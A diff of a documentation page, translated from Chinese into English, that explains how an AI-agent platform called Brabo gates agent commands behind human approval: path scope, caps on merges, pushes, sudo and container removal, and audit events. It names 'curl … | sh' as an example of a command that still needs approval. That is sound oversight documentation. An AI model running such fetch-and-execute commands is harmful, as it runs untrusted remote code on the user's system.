+compound-command rule — every segment needs to match — and <strong>every</strong>
+command would stop for approval, no matter how much the verb was allowed.</p>
+<p>Four limits worth understanding:</p>
 <ul>
-<li><strong>范围允许，而不豁免。</strong> 位于项目文件夹中并不会让
-<code>curl … | sh</code> 变得安全：不在 <code>allow</code> 中的动词仍需审批。</li>
-<li><strong>范围之外是 <code>require_approval</code>，不是 <code>deny</code>。</strong> agent 可能有查看外部的正当理由；决定者仍然是你。</li>
-<li><strong>自动模式跳过这一上限。</strong> 带有通配符
-<code>&quot;*&quot;: auto_approve</code> 的 agent 会不经询问地运行范围外的命令
-（<a href="../business-rules/api.html#rn-603">RN-603</a>）；把 agent 卡片切回“手动”即可恢复。</li>
-<li><strong>规范化是词法的，不是 <code>realpath</code>。</strong> <code>&lt;raiz&gt;/../..</code> 会被解析并拒绝；项目内指向外部的符号链接<strong>不会</strong>被检测到。范围是策略，不是隔离。</li>
+<li><strong>Scope permits, it doesn't exempt.</strong> Being in the project folder
+doesn't make <code>curl … | sh</code> safe: a verb outside <code>allow</code> still requires
+approval.</li>
+<li><strong>Outside the scope is <code>require_approval</code>, not <code>deny</code>.</strong> The agent may
+have a legitimate reason to look outside; who decides remains you.</li>
+<li><strong>Auto mode skips this cap.</strong> An agent with the <code>&quot;*&quot;: auto_approve</code>
+wildcard runs commands outside the scope without asking
+(<a href="../business-rules/api.html#rn-603">RN-603</a>); turning the agent
+card back to &quot;manual&quot; restores it.</li>
+<li><strong>Normalization is lexical, not <code>realpath</code>.</strong> <code>&lt;raiz&gt;/../..</code> is resolved
+and rejected; a symbolic link inside the project pointing outward is
+<strong>not</strong> detected. Scope is policy, not isolation.</li>
 </ul>
-<p>检查哪些词元：<strong>绝对</strong>的（以 <code>/</code> 开头）以及包含 <code>..</code> 的。不含 <code>..</code> 的相对路径解析在已检查过的 <code>cwd</code> 之下——而把 <code>-maxdepth</code>、<code>4</code> 或 <code>*.ex</code> 当作路径会拒绝合法命令，却不带来任何安全收益。</p>
-<p>由此得出两个属性：</p>
-<p><strong><code>deny</code> 立即胜出。</strong> 无论出现在哪一步，它都会立即返回。没有任何配置能逆转 <code>deny</code>。</p>
-<p><strong>沉默的步骤从不降级。</strong> 如果 <code>agent_autonomy</code> 说 <code>auto_approve</code> 而
-<code>permissions.json</code> 对该动作没有规则，结果仍是
-<code>auto_approve</code>——文件不会因省略而“投反对票”。每一步只能提高前一步的放行程度。</p>
-<h2 id="caps">上限</h2>
-<p><strong>最后</strong>应用，在其余一切之后：</p>
+<p>Which tokens are checked: <strong>absolute</strong> ones (start with <code>/</code>) and ones that
+contain <code>..</code>. A relative one without <code>..</code> resolves under the <code>cwd</code>, which
+was already checked — and treating <code>-maxdepth</code>, <code>4</code>, or <code>*.ex</code> as a path
+would reject a legitimate command without gaining any security.</p>
+<p>Two properties that fall out of this:</p>
+<p><strong><code>deny</code> wins immediately.</strong> No matter what stage it appears in, it
+returns right away. There's no configuration that reverts a <code>deny</code>.</p>
+<p><strong>A silent stage never downgrades.</strong> If <code>agent_autonomy</code> said
+<code>auto_approve</code> and <code>permissions.json</code> has no rule for that action, the
+result stays <code>auto_approve</code> — the file doesn't &quot;vote against&quot; by
+omission. Each stage can only raise the permissiveness of the previous
+one.</p>
+<h2 id="caps">Caps</h2>
+<p>Applied <strong>last</strong>, after everything else:</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>上限</th>
-<th>效果</th>
-<th>原因</th>
+<th>cap</th>
+<th>effect</th>
+<th>why</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>目标为 <code>dev</code>、<code>qa</code>、<code>rc</code> 或 <code>main</code> 的 <code>git_merge</code></td>
+<td><code>git_merge</code> with destination in <code>dev</code>, <code>qa</code>, <code>rc</code> or <code>main</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>合并到受保护 branch 始终是你的决定（<a href="../business-rules/api.html#rn-006">RN-006</a>）</td>
+<td>merge into a protected branch is always your decision (<a href="../business-rules/api.html#rn-006">RN-006</a>)</td>
 </tr>
 <tr>
 <td><code>instruction_patch</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>在一个 agent 改变另一个 agent 的行为之前，你需要看到 diff（<a href="../business-rules/api.html#rn-007">RN-007</a>）</td>
+<td>you need to see the diff before one agent changes another's behavior (<a href="../business-rules/api.html#rn-007">RN-007</a>)</td>
 </tr>
 <tr>
-<td><code>parallelize</code> 和 <code>raise_max_parallel</code></td>
+<td><code>parallelize</code> and <code>raise_max_parallel</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>在更多 agent 上花钱是你的决定；没有这一上限，lead 的限制就是装饰，而提高自己的上限就是产品在提高自己的支出限额（<a href="../business-rules/api.html#rn-086">RN-086</a>）</td>
+<td>spending on more agents is your decision; without this cap the lead's limit would be decorative, and raising the cap itself would be the product raising its own spending limit (<a href="../business-rules/api.html#rn-086">RN-086</a>)</td>
 </tr>
 <tr>
-<td>带有外部效果 git（push/PR/deploy）或 <code>sudo</code>/<code>doas</code> 的 <code>terminal</code></td>
+<td><code>terminal</code> with external-effect git (push/PR/deploy) or <code>sudo</code>/<code>doas</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>有外部效果的 git 和特权命令永远不可自动批准，即使开启了“自动模式”（<a href="../business-rules/api.html#rn-418">RN-418</a>，修订 <a href="../business-rules/api.html#rn-106">RN-106</a>）——见上方专门一节</td>
+<td>external-effect git and privileged commands are never auto-approvable, even with &quot;automatic mode&quot; on (<a href="../business-rules/api.html#rn-418">RN-418</a>, revises <a href="../business-rules/api.html#rn-106">RN-106</a>) — see the dedicated section above</td>
 </tr>
 <tr>
-<td>有类型的 <code>git_push</code> 和 <code>pr_open</code></td>
+<td>typed <code>git_push</code> and <code>pr_open</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>经由有类型入口的同一个 RN-418 上限：无论是自动模式的通配符、<code>agent_autonomy</code> 的具体规则，还是 <code>permissions.json</code>，都不会提升它们（<a href="../business-rules/api.html#rn-689">RN-689</a>）。<code>git_merge</code> 保留自己的上限（第一行）；<code>deploy</code> 不是 <code>proposed_action</code> 的类型</td>
+<td>the same RN-418 cap through the typed door: neither the auto-mode wildcard, nor a specific <code>agent_autonomy</code> rule, nor <code>permissions.json</code> promotes them (<a href="../business-rules/api.html#rn-689">RN-689</a>). <code>git_merge</code> keeps its own cap (first row); <code>deploy</code> is not a <code>proposed_action</code> type</td>
 </tr>
 <tr>
 <td><code>container_remove</code></td>
 <td><code>auto_approve</code> → <code>require_approval</code></td>
-<td>丢弃容器会强制完全重新配置——与合并到受保护 branch 同一量级，每次都要决定，绝不一次性配置（<a href="../business-rules/api.html#rn-495">RN-495</a>）</td>
+<td>discarding a container forces a full reprovision — the same caliber as merging into a protected branch, decided every time, never configured once (<a href="../business-rules/api.html#rn-495">RN-495</a>)</td>
 </tr>
 </tbody>
 </table></div>
-<p>上限把 <code>auto_approve</code> 降为 <code>require_approval</code>；它<strong>不会</strong>把
-<code>deny</code> 变成别的东西，因为 <code>deny</code> 早已提前返回。</p>
-<div class="admonicao admonicao-note" data-admonicao="note"><p class="admonicao-titulo">为什么 `rc` 仍在列表中</p>
-<p><code>rc</code> 这一级已从 branch 策略中移除
-（<a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030</a>），bootstrap
-也不再创建它（<a href="../business-rules/api.html#rn-029">RN-029</a>）——但它仍在这里，在 <code>domain/actions/protected-branches.ts</code> 中。</p>
-<p>这个列表决定合并锁<strong>拒绝</strong>什么，而由早期版本 Brabo bootstrap 的仓库仍有这个 branch。从这里移除它不会从任何人的仓库中移除任何东西：只会让以 <code>rc</code> 为目标的
-<code>git_merge</code> 变得可自动批准，而这个 branch 可能正被某人用作生产。</p>
-<p>保护一个不存在的 branch 没有成本。取消保护一个存在的 branch 代价高昂——这种不对称是有意的。</p>
+<p>A cap downgrades <code>auto_approve</code> to <code>require_approval</code>; it does <strong>not</strong>
+turn <code>deny</code> into something else, because <code>deny</code> would have already
+returned earlier.</p>
+<div class="admonicao admonicao-note" data-admonicao="note"><p class="admonicao-titulo">Why `rc` is still on the list</p>
+<p>The <code>rc</code> rung left the branch policy
+(<a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030</a>) and the
+bootstrap stopped creating it (<a href="../business-rules/api.html#rn-029">RN-029</a>) —
+but it's still here, in <code>domain/actions/protected-branches.ts</code>.</p>
+<p>This list decides what the merge lock <strong>refuses</strong>, and repositories
+bootstrapped by earlier versions of Brabo still have the branch. Removing
+it from here wouldn't remove anything from anyone's repository: it would
+only make a <code>git_merge</code> with destination <code>rc</code> auto-approvable, on a branch
+someone might be using as production.</p>
+<p>Protecting a branch that doesn't exist costs nothing. Unprotecting one
+that exists costs dearly — and the asymmetry is deliberate.</p>
 </div>
-<p>上限与默认值的区别：默认值是没有人配置任何东西时发生的事；上限是<strong>无论</strong>配置了什么都会发生的事。</p>
-<h2 id="决定未到时-agent-发生什么">决定未到时 agent 发生什么</h2>
-<p><code>pending</code> 动作不只是一行在等待点击：另一端有一个停住的 agent。</p>
-<p>当它调用的工具处于待处理时，它的循环<strong>挂起</strong>，保留任务、worktree 和对话历史，并进入
-<code>awaiting_approval</code>。你的决定发出 <code>task.action_settled</code>，将它唤醒：命令的真实结果占据回答本应所在的位置，循环从停下处继续。</p>
-<p><strong>拒绝也是回答。</strong> 原因占据结果的位置，agent 得知那条路已关闭，而不是永远等待——拒绝不会让它卡住。</p>
-<p>这对运维者很重要：迟些批准不会浪费已完成的工作，审批队列也不是为了方便才异步——它就是 agent 字面上在等待的东西。在此之前，<code>pending</code> 会被当作命令的回答返回，agent 会烧掉迭代上限去尝试别的东西，直到任务在一行未写的情况下死去
-（<a href="../business-rules/engine.html#rn-073">RN-073</a>）。</p>
-<p><strong>有一个例外：engine 重启。</strong> 挂起的循环位于内存中，因此重启会把它一并带走。这种情况下任务<strong>不会</strong>继续等待：它回到被阻塞队列，事件日志中有原因和来源 <code>infra</code>，此后做出的决定不再有地方应用——已决定的动作被记录，但等待它的轮次已不存在。如果你批准了而什么都没发生，这里是首先要看的地方。</p>
-<p>自动批准不经过这里：它在提案时执行，结果在同一轮次中返回——这正是拥有上一节那些模式的价值所在。</p>
-<p><strong>Dev Lead 以同样方式挂起，但在重启时有一处不同</strong>
-（ADR 0086，<a href="../business-rules/engine.html#rn-284">RN-284</a>）。它是对话型的，没有 worktree 也没有任务——挂起的是轮次的同步 <code>handle_call</code>，经由 <code>agent.status: awaiting_approval</code>。与 dev agent 不同，它在 engine 重启时<strong>没有</strong>可以回去的队列：决定仍被记录并在“审批”中可见，但 Dev Lead 不会自己讲述结果——等待的进程已死，下一次重启会启动一个新的 Dev Lead，没有对该动作的订阅。这是一个被接受并声明的缺口，而非掩饰。</p>
-<h2 id="每次决定记录什么">每次决定记录什么</h2>
-<p>每个提出的动作以及对它的每个决定都会成为 <code>session_events</code> 中的一个<strong>领域事件</strong>，带有真实的行动者
-（<a href="../business-rules/api.html#rn-049">RN-049</a>）：</p>
+<p>The difference between a cap and a default: the default is what happens
+when nobody configured anything; the cap is what happens <strong>regardless</strong> of
+what was configured.</p>
+<h2 id="what-happens-to-the-agent-while-the-decision-doesnt-come">What happens to the agent while the decision doesn't come</h2>
+<p>A <code>pending</code> action isn't just a row waiting for a click: on the other side
+there's an agent stopped.</p>
+<p>When the tool it called becomes pending, its loop <strong>suspends</strong>, holding on
+to the task, the worktree, and the conversation history, and it enters
+<code>awaiting_approval</code>. Your decision emits <code>task.action_settled</code>, which
+wakes it up: the real result of the command takes the place where the
+response would be, and the loop resumes from where it stopped.</p>
+<p><strong>Refusing also responds.</strong> The reason takes the place of the result, and
+the agent learns that path is closed instead of waiting forever — denying
+doesn't leave it stuck.</p>
+<p>This matters for whoever operates: approving late doesn't waste the work
+already done, and the approval queue isn't asynchronous for convenience —
+it's literally what the agent is waiting for. Before this, <code>pending</code> came
+back as if it were the command's response, and the agent burned its
+iteration cap trying something else until the task died without a single
+line written (<a href="../business-rules/engine.html#rn-073">RN-073</a>).</p>
+<p><strong>With one exception: engine restart.</strong> The suspended loop lives in
+memory, so a restart takes it down with it. In that case the task does
+<strong>not</strong> stay waiting: it goes back to the blocked queue, with the reason
+and origin <code>infra</code> in the event log, and a decision made after that has
+nowhere left to be applied — the decided action stays recorded, but the
+turn that was waiting for it no longer exists. If you approved and nothing
+happened, this is the first place to look.</p>
+<p>Auto-approval doesn't go through here: it executes at the proposal and the
+result comes back in the same turn — which is exactly the value of having
+the patterns from the previous section.</p>
+<p><strong>The Dev Lead suspends the same way, with one difference on restart</strong>
+(ADR 0086, <a href="../business-rules/engine.html#rn-284">RN-284</a>). It's conversational, it
+has no worktree or task — what suspends is the turn's synchronous
+<code>handle_call</code>, via <code>agent.status: awaiting_approval</code>. Unlike the dev
+agent, it does NOT have a queue to return to on an engine restart: the
+decision remains recorded and visible in Approvals, but the Dev Lead
+doesn't narrate the outcome on its own — the process that was waiting
+died, and the next restart brings up a new Dev Lead, with no subscription
+for that action. An accepted and declared gap, not a disguised one.</p>
+<h2 id="what-gets-written-for-each-decision">What gets written for each decision</h2>
+<p>Every proposed action and every decision about it become a <strong>domain
+event</strong> in <code>session_events</code>, with the real actor
+(<a href="../business-rules/api.html#rn-049">RN-049</a>):</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>事件</th>
-<th>行动者</th>
-<th>何时</th>
+<th>event</th>
+<th>actor</th>
+<th>when</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>proposed_action.created</code></td>
-<td>提出它的 <strong>agent</strong></td>
-<td>总是，在任何执行之前。<code>payload.status</code> 说明动作如何诞生：<code>pending</code>、<code>auto_approved</code> 或 <code>denied</code>；<code>payload.reason</code> 说明是 <code>decide()</code> 的哪条规则产生了它（<a href="../business-rules/api.html#rn-567">RN-567</a>）</td>
+<td>the <strong>agent</strong> that proposed it</td>
+<td>always, before any execution. <code>payload.status</code> says how the action was born: <code>pending</code>, <code>auto_approved</code>, or <code>denied</code>; <code>payload.reason</code> says which rule of <code>decide()</code> produced it (<a href="../business-rules/api.html#rn-567">RN-567</a>)</td>
 </tr>
 <tr>
 <td><code>proposed_action.approved</code></td>
-<td>点击的<strong>用户</strong></td>
-<td>仅在手动批准时（包括 <code>approve_always</code>）</td>
+<td>the <strong>user</strong> who clicked</td>
+<td>only on manual approval (including <code>approve_always</code>)</td>
 </tr>
 <tr>
 <td><code>permission.granted</code></td>
-<td>点击“始终允许”的<strong>用户</strong></td>
-<td>仅当这次点击确实写入了模式——<code>payload.patterns</code>（写入的模式，每个片段一个，<a href="../business-rules/api.html#rn-675">RN-675</a>）和 <code>payload.pattern</code>（同一列表以 &quot;, &quot; 连接），或对模块 dev agent 为 <code>payload.agentId</code>/<code>actionType</code>（<a href="../business-rules/api.html#rn-642">RN-642</a>）</td>
+<td>the <strong>user</strong> who clicked &quot;always allow&quot;</td>
+<td>only when the click actually recorded a pattern — <code>payload.patterns</code> (the patterns recorded, one per segment, <a href="../business-rules/api.html#rn-675">RN-675</a>) and <code>payload.pattern</code> (the same list joined by &quot;, &quot;), or <code>payload.agentId</code>/<code>actionType</code> for a module dev agent (<a href="../business-rules/api.html#rn-642">RN-642</a>)</td>
 </tr>
 <tr>
 <td><code>proposed_action.denied</code></td>
-<td>拒绝的<strong>用户</strong></td>
-<td>带 <code>payload.reason</code></td>
+<td>the <strong>user</strong> who refused</td>
+<td>with <code>payload.reason</code></td>
 </tr>
 <tr>
 <td><code>action.executed</code> / <code>action.failed</code></td>
 <td><code>system</code></td>
-<td>执行的结果</td>
+<td>execution outcome</td>
 </tr>
 </tbody>
 </table></div>
-<p>由此得出区分本文所描述两件事的唯一可靠方法：</p>
+<p>From this comes the only reliable way to separate the two things this
+document describes:</p>
 <ul>
-<li><strong>人的决定</strong> = 统计 <code>proposed_action.approved</code> 事件；</li>
-<li><strong>策略的决定</strong> = <code>status: auto_approved</code> 且行动者为 agent 的 <code>proposed_action.created</code>。它从不产生 <code>.approved</code>，因此从不与点击混淆。它的 <code>reason</code> 说明是<strong>哪条</strong>规则自动批准的——<code>agent_autonomy: auto_approve</code>、<code>permissions.json</code> 的一行 <code>allow</code>、容器下限、<code>escopo: cd dentro da pasta do projeto</code>——采用 <code>decide()</code> 使用的确切文本。在
-<a href="../business-rules/api.html#rn-567">RN-567</a> 之前写入的事件没有 <code>reason</code>：请将其理解为“未记录”，而不是“没有规则”。原因点名的是规则，而不是范围的根；自 <a href="../business-rules/api.html#rn-609">RN-609</a> 起，<code>terminal</code> 动作的事件还带有 <code>scopeRoot</code>——执行模式加上路径范围所比较的根的一个<strong>相对</strong>标识（<code>container</code>/<code>runner</code> 中为
-<code>workspace_dir_name</code>，<code>mounted</code> 中为
-<code>BRABO_PROJECTS_BASE</code> 之下的片段），绝不是绝对路径，后者会把用户的
-<code>$HOME</code> 暴露给每个成员。outbox 的行既不带 <code>reason</code> 也不带
-<code>scopeRoot</code>——engine 的任何消费者都不读取它们。自
-<a href="../business-rules/web.html#rn-614">RN-614</a> 起，界面显示两者，组成一句由单一函数构造的话：在会话日志面板的事件行中，以及在审批卡片中（会话聊天和“审批”标签页的队列）。较旧的事件显示“未记录”，当事件不在该界面已加载的事件中时，卡片也会这样显示。</li>
+<li><strong>human decision</strong> = count <code>proposed_action.approved</code> events;</li>
+<li><strong>policy decision</strong> = <code>proposed_action.created</code> with <code>status: auto_approved</code> and an agent actor. It never produces a <code>.approved</code>, and
+so it's never confused with a click. Its <code>reason</code> says <strong>which</strong> rule
+auto-approved — <code>agent_autonomy: auto_approve</code>, a <code>permissions.json allow</code>
+line, the container floor, <code>escopo: cd dentro da pasta do projeto</code> — in
+the exact wording <code>decide()</code> uses. Events recorded before
+<a href="../business-rules/api.html#rn-567">RN-567</a> have no <code>reason</code>: read that as &quot;not
+recorded&quot;, not as &quot;no rule&quot;. The reason names the rule, not the scope
+root; since <a href="../business-rules/api.html#rn-609">RN-609</a> a <code>terminal</code> action's
+event also carries <code>scopeRoot</code> — the execution mode plus a RELATIVE
+identifier of the root the path scope compared against (the
+<code>workspace_dir_name</code> in <code>container</code>/<code>runner</code>, the segment under
+<code>BRABO_PROJECTS_BASE</code> in <code>mounted</code>), never the absolute path, which would
+expose the user's <code>$HOME</code> to every member. The outbox row carries neither
+<code>reason</code> nor <code>scopeRoot</code> — no engine consumer reads them. Since
+<a href="../business-rules/web.html#rn-614">RN-614</a> the UI shows both, in one sentence
+built by one function: on the event's line in the session log panel and on
+the approval card (session chat and the Approvals tab queue). An older
+event says &quot;not recorded&quot;, and the card says so when the event is outside
+the events loaded on that screen.</li>
 </ul>
-<p>直到 Fase 12e 这都不成立。前三行<strong>只进入 outbox</strong>，而 outbox 是传输——被清空、标记 <code>processed_at</code> 并被修剪——决定只存活在 <code>proposed_actions.decided_at</code> 中，这是界面、心理学家和 Anamnese 读取的时间线之外的一列。实际结果是，在 Fase 10 的 dogfooding 中无法回答“人批准了多少次”，而这恰恰是那次实验的主要指标。</p>
-<p>仓库的 bootstrap 是有意的例外：它提出的变更不会在日志中发出 <code>proposed_action.created</code>，因为它们已在同一会话中由
-<code>bootstrap.step_*</code> 讲述——再次计数会用没人批准的工作虚增审批指标。</p>
+<p>This wasn't true until Phase 12e. The first three rows went <strong>only to the
+outbox</strong>, which is transport — drained, marked with <code>processed_at</code>, and
+pruned — and the decision survived only in <code>proposed_actions.decided_at</code>,
+a column outside the timeline that the UI, the Psychologist, and the
+Anamnesis read. The practical result was that &quot;how many times did the
+human approve&quot; couldn't be answered in the Phase 10 dogfooding, which was
+exactly that experiment's main metric.</p>
+<p>Repository bootstrap is the deliberate exception: the mutations it
+proposes don't emit <code>proposed_action.created</code> in the log, because they're
+already narrated by <code>bootstrap.step_*</code> in the same session — counting them
+again would inflate the approval metric with work nobody approved.</p>
 <nav class="site-pager"><a href="../reference/events.html">Eventos</a><a href="../reference/artifacts.html">Artefatos</a></nav>
 </article>
 <footer class="site-foot"><a href="https://github.com/viralabs-dev/brabo-api/blob/dev/docs/reference/permissions.md">编辑此页</a></footer>
 </main>
-<aside class="site-toc"><h2>本页内容</h2><ul><li class="n2"><a href="#文件">文件</a></li><li class="n3"><a href="#自动批准的动作用哪个凭据执行">自动批准的动作用哪个凭据执行</a></li><li class="n2"><a href="#模式的格式">模式的格式</a></li><li class="n2"><a href="#模式如何匹配命令">模式如何匹配命令</a></li><li class="n2"><a href="#复合命令">复合命令</a></li><li class="n2"><a href="#内置模式">内置模式</a></li><li class="n2"><a href="#激活执行时预置什么">激活执行时预置什么</a></li><li class="n2"><a href="#决策的完整顺序">决策的完整顺序</a></li><li class="n3"><a href="#自动模式agent_autonomy-的通配符rn-153">“自动模式”：agent_autonomy 的通配符（RN-153）</a></li><li class="n3"><a href="#容器下限rn-492rn-493adr-0134">容器下限（RN-492/RN-493，ADR 0134）</a></li><li class="n2"><a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">外部效果与特权命令的边界（RN-418）</a></li><li class="n2"><a href="#path-scope">路径范围</a></li><li class="n2"><a href="#caps">上限</a></li><li class="n2"><a href="#决定未到时-agent-发生什么">决定未到时 agent 发生什么</a></li><li class="n2"><a href="#每次决定记录什么">每次决定记录什么</a></li></ul></aside>
+<aside class="site-toc"><h2>本页内容</h2><ul><li class="n2"><a href="#the-file">The file</a></li><li class="n3"><a href="#with-which-credential-the-auto-approved-action-executes">With which credential the auto-approved action executes</a></li><li class="n2"><a href="#the-pattern-format">The pattern format</a></li><li class="n2"><a href="#how-a-pattern-matches-a-command">How a pattern matches a command</a></li><li class="n2"><a href="#compound-command">Compound command</a></li><li class="n2"><a href="#built-in-patterns">Built-in patterns</a></li><li class="n2"><a href="#what-activating-execution-seeds">What activating execution seeds</a></li><li class="n2"><a href="#the-complete-decision-order">The complete decision order</a></li><li class="n3"><a href="#auto-mode-the-agent_autonomy-wildcard-rn-153">&quot;Auto mode&quot;: the agent_autonomy wildcard (RN-153)</a></li><li class="n3"><a href="#the-container-floor-rn-492rn-493-adr-0134">The container floor (RN-492/RN-493, ADR 0134)</a></li><li class="n2"><a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">The boundary of external effect and privileged command (RN-418)</a></li><li class="n2"><a href="#path-scope">Path scope</a></li><li class="n2"><a href="#caps">Caps</a></li><li class="n2"><a href="#what-happens-to-the-agent-while-the-decision-doesnt-come">What happens to the agent while the decision doesn't come</a></li><li class="n2"><a href="#what-gets-written-for-each-decision">What gets written for each decision</a></li></ul></aside>
 </div>
 <script src="../../assets/mermaid.min.js"></script>
 <script src="../../assets/site.js"></script>
